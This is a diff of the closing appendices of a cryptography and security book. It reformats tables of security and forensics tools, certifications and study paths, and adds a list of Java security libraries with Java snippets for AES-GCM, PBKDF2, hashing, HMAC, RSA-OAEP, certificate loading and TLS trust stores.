+| `traceroute` / `tracepath` | Network path analysis |
+| `dig` / `nslookup` | DNS lookup |
+| `curl` / `wget` | HTTP client with SSL info |
 
 ### Network Security
-
-|Tool|Purpose|
-|---|---|
-|`nmap --script`|NSE scripts for vulnerability detection|
-|`nikto`|Web server scanner|
-|`metasploit`|Exploit framework|
-|`burpsuite`|Web application testing proxy|
-|`sqlmap`|SQL injection testing|
-|`aircrack-ng`|Wi-Fi security auditing|
-|`bettercap`|Network attack framework|
-|`hashcat` / `hydra`|Password cracking|
+| Tool | Purpose |
+|------|---------|
+| `nmap --script` | NSE scripts for vulnerability detection |
+| `nikto` | Web server scanner |
+| `metasploit` | Exploit framework |
+| `burpsuite` | Web application testing proxy |
+| `sqlmap` | SQL injection testing |
+| `aircrack-ng` | Wi-Fi security auditing |
+| `bettercap` | Network attack framework |
+| `hashcat` / `hydra` | Password cracking |
 
 ### Forensics
-
-|Tool|Purpose|
-|---|---|
-|`volatility3`|Memory forensics|
-|`autopsy` / `sleuthkit`|Disk forensics|
-|`dc3dd` / `dd`|Forensic disk imaging|
-|`foremost` / `bulk_extractor`|File carving|
-|`yara`|Malware pattern matching|
-|`strings`|Extract strings from binary|
+| Tool | Purpose |
+|------|---------|
+| `volatility3` | Memory forensics |
+| `autopsy` / `sleuthkit` | Disk forensics |
+| `dc3dd` / `dd` | Forensic disk imaging |
+| `foremost` / `bulk_extractor` | File carving |
+| `yara` | Malware pattern matching |
+| `strings` | Extract strings from binary |
 
 ---
 
 ## Appendix G: Further Learning Resources
 
 ### Books
-
 - **"Serious Cryptography"** by Jean-Philippe Aumasson — Best practical cryptography book
 - **"Applied Cryptography"** by Bruce Schneier — Classic reference
 - **"Cryptography Engineering"** by Ferguson, Schneier, Kohno — Engineering focus
@@ -4623,27 +4613,173 @@ Test with: `ssl-labs.com/ssltest/` or `testssl.sh`
 - **"The Art of Intrusion"** by Kevin Mitnick — Social engineering and attack stories
 
 ### Online Courses
-
 - **Cryptography I & II** — Dan Boneh, Stanford (Coursera) — Best cryptography course
 - **CS 161 Computer Security** — UC Berkeley — Excellent free course
-- **OWASP WebGoat** — Hands-on web security training
+- **OWASP WebGoat** — Hands-on web security training (Java-based!)
 - **TryHackMe / HackTheBox** — Hands-on security labs
 - **PentesterLab** — Web vulnerability practice
 
-### Certifications
+### Java Security Libraries & Frameworks
 
-|Certification|Level|Focus|
-|---|---|---|
-|CompTIA Security+|Entry|Broad security fundamentals|
-|CEH|Mid|Ethical hacking|
-|OSCP|Mid-Advanced|Penetration testing (practical)|
-|CISSP|Advanced|Security management|
-|CISM|Advanced|Security management|
-|CCNA Security|Mid|Cisco networking security|
-|AWS Security Specialty|Mid|Cloud security|
+| Library / Artifact | Purpose |
+|-------------------|---------|
+| **JCA / JCE** (built-in) | Core Java crypto: `javax.crypto`, `java.security` |
+| **Bouncy Castle** `bcprov-jdk18on` | Full crypto suite: AES, RSA, ECC, PQC, HKDF, Argon2 |
+| **Spring Security Crypto** | Password encoding (bcrypt, Argon2, SCrypt), key management |
+| **Tink (Google)** `google-tink` | High-level, misuse-resistant crypto API (AEAD, signatures, hybrid) |
+| **Nimbus JOSE+JWT** | JWT, JWS, JWE, JWK — industry standard library |
+| **JJWT** `io.jsonwebtoken:jjwt-api` | Popular JWT library for Spring/Java |
+| **OkHttp + certificate pinning** | HTTPS client with built-in cert pinning support |
+| **argon2-jvm** `de.mkammerer:argon2-jvm` | Argon2id password hashing |
+| **jBCrypt** `org.mindrot:jbcrypt` | bcrypt password hashing |
+| **OWASP Java Encoder** `org.owasp.encoder:encoder` | Context-aware HTML/JS/URL output encoding |
+| **OWASP ESAPI** | Enterprise security API for Java |
+| **Hibernate Validator / Bean Validation** | Input validation (`@NotNull`, `@Pattern`, `@Size`) |
+
+### Useful Java Code Snippets Reference
+
+**AES-256-GCM Encrypt/Decrypt:**
+```java
+import javax.crypto.*;
+import javax.crypto.spec.*;
+import java.security.*;
+
+public static byte[] aesGcmEncrypt(byte[] plaintext, SecretKey key) throws Exception {
+    byte[] iv = new byte[12];
+    new SecureRandom().nextBytes(iv);
+    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+    cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
+    byte[] ciphertext = cipher.doFinal(plaintext);
+    // Prepend IV to ciphertext for storage/transmission
+    byte[] result = new byte[iv.length + ciphertext.length];
+    System.arraycopy(iv, 0, result, 0, iv.length);
+    System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);
+    return result;
+}
+
+public static byte[] aesGcmDecrypt(byte[] ivAndCiphertext, SecretKey key) throws Exception {
+    byte[] iv         = Arrays.copyOfRange(ivAndCiphertext, 0, 12);
+    byte[] ciphertext = Arrays.copyOfRange(ivAndCiphertext, 12, ivAndCiphertext.length);
+    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+    cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
+    return cipher.doFinal(ciphertext); // throws AEADBadTagException if tampered
+}
+```
+
+**PBKDF2 Key Derivation (built-in Java, no dependency):**
+```java
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.PBEKeySpec;
+
+public static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int keyLenBits)
+        throws Exception {
+    PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, keyLenBits);
+    SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
+    byte[] key = skf.generateSecret(spec).getEncoded();
+    spec.clearPassword(); // erase password from memory
+    return key;
+}
+// Usage: byte[] key = pbkdf2("password".toCharArray(), salt, 600_000, 256);
+```
+
+**SHA-256 Hash:**
+```java
+import java.security.MessageDigest;
+
+public static String sha256Hex(byte[] data) throws Exception {
+    MessageDigest md = MessageDigest.getInstance("SHA-256");
+    byte[] hash = md.digest(data);
+    StringBuilder sb = new StringBuilder();
+    for (byte b : hash) sb.append(String.format("%02x", b));
+    return sb.toString();
+}
+```
+
+**HMAC-SHA256:**
+```java
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+
+public static byte[] hmacSha256(byte[] key, byte[] data) throws Exception {
+    Mac mac = Mac.getInstance("HmacSHA256");
+    mac.init(new SecretKeySpec(key, "HmacSHA256"));
+    return mac.doFinal(data);
+}
+```
+
+**RSA-2048 Key Generation + Encrypt/Decrypt:**
+```java
+import java.security.*;
+import javax.crypto.*;
+import javax.crypto.spec.OAEPParameterSpec;
+import java.security.spec.MGF1ParameterSpec;
+import javax.crypto.spec.PSource;
+
+// Generate key pair
+KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
+kpg.initialize(2048, new SecureRandom());
+KeyPair keyPair = kpg.generateKeyPair();
+
+// Encrypt with RSA-OAEP (SHA-256 hash, SHA-256 MGF1)
+OAEPParameterSpec oaepSpec = new OAEPParameterSpec(
+    "SHA-256", "MGF1", MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT);
+Cipher enc = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
+enc.init(Cipher.ENCRYPT_MODE, keyPair.getPublic(), oaepSpec);
+byte[] ciphertext = enc.doFinal("Secret message".getBytes(StandardCharsets.UTF_8));
+
+// Decrypt
+Cipher dec = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
+dec.init(Cipher.DECRYPT_MODE, keyPair.getPrivate(), oaepSpec);
+byte[] plaintext = dec.doFinal(ciphertext);
+```
+
+**Load X.509 Certificate from File:**
+```java
+import java.security.cert.*;
+import java.io.*;
+
+CertificateFactory cf = CertificateFactory.getInstance("X.509");
+try (FileInputStream fis = new FileInputStream("server.crt")) {
+    X509Certificate cert = (X509Certificate) cf.generateCertificate(fis);
+    System.out.println("Subject: " + cert.getSubjectX500Principal());
+    System.out.println("Issuer:  " + cert.getIssuerX500Principal());
+    System.out.println("Expires: " + cert.getNotAfter());
+    cert.checkValidity();              // throws if expired
+    cert.verify(issuerCert.getPublicKey()); // throws if invalid signature
+}
+```
+
+**TLS Client with Custom Trust Store:**
+```java
+import javax.net.ssl.*;
+import java.security.*;
+
+KeyStore trustStore = KeyStore.getInstance("PKCS12");
+try (FileInputStream fis = new FileInputStream("truststore.p12")) {
+    trustStore.load(fis, "changeit".toCharArray());
+}
+TrustManagerFactory tmf = TrustManagerFactory.getInstance("PKIX");
+tmf.init(trustStore);
+
+SSLContext sslContext = SSLContext.getInstance("TLSv1.3");
+sslContext.init(null, tmf.getTrustManagers(), new SecureRandom());
+
+// Use with HttpsURLConnection or Apache HttpClient or OkHttp
+HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());
+```
+
+### Certifications
+| Certification | Level | Focus |
+|--------------|-------|-------|
+| CompTIA Security+ | Entry | Broad security fundamentals |
+| CEH | Mid | Ethical hacking |
+| OSCP | Mid-Advanced | Penetration testing (practical) |
+| CISSP | Advanced | Security management |
+| CISM | Advanced | Security management |
+| CCNA Security | Mid | Cisco networking security |
+| AWS Security Specialty | Mid | Cloud security |
 
 ### Standards and Specifications
-
 - **NIST Cryptographic Standards**: csrc.nist.gov
 - **OWASP**: owasp.org
 - **IETF RFCs**: rfc-editor.org
@@ -4659,19 +4795,15 @@ Test with: `ssl-labs.com/ssltest/` or `testssl.sh`
 Here is a suggested path through this book depending on your starting point:
 
 ### Path 1: Complete Beginner
-
 Chapter 1 → 2 → 3 → 4 → 18 → 19 → 20 → 21 → 22 → 5 → 6 → 7 → 13 → 15 → 24 → 29 → 30
 
 ### Path 2: Developer Wanting Cryptography
-
 Chapter 1 → 2 → 5 → 6 → 7 → 8 → 9 → 10 → 11 → 12 → 13 → 14 → 15 → 16 → 35
 
 ### Path 3: Network Engineer Wanting Security
-
 Chapter 1 → 18 → 19 → 20 → 21 → 22 → 23 → 24 → 25 → 26 → 27 → 28 → 30
 
 ### Path 4: Security Researcher / Expert
-
 Chapter 31 → 32 → 33 → 17 → 34 → then fill in any gaps
 
 ### Skills Milestones
@@ -4686,8 +4818,8 @@ Chapter 31 → 32 → 33 → 17 → 34 → then fill in any gaps
 
 ---
 
-_This book covers the state of knowledge as of 2024. Cryptography and security evolve rapidly — always check current standards (NIST, IETF) and stay subscribed to security advisories (CISA, vendor bulletins) to keep your knowledge current._
+*This book covers the state of knowledge as of 2024. Cryptography and security evolve rapidly — always check current standards (NIST, IETF) and stay subscribed to security advisories (CISA, vendor bulletins) to keep your knowledge current.*
 
 ---
-
-## **End of Book**
+**End of Book**
+---
